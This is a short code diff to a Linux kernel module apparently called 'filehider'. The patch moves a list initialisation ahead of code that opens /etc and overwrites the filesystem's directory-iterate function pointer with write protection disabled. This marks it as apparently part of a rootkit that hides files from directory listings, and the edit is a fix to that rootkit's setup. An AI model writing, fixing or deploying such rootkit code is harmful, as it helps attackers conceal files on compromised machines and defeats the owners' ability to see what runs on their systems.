@@ -45,6 +45,8 @@ int filehider_init(void)
     struct file *filep_etc;
     void *iterate_addr;
 
+    INIT_LIST_HEAD(&file_list.list);
+
     filep_etc = filp_open("/etc", O_RDONLY, 0);
     if (filep_etc == NULL) {
         LOG_ERROR("could not open /etc");
@@ -66,8 +68,6 @@ int filehider_init(void)
 #else
     write_no_prot(&fs_fops->iterate, &iterate_addr, sizeof(void*));
 #endif
-
-    INIT_LIST_HEAD(&file_list.list);
 
     return 0;
 }
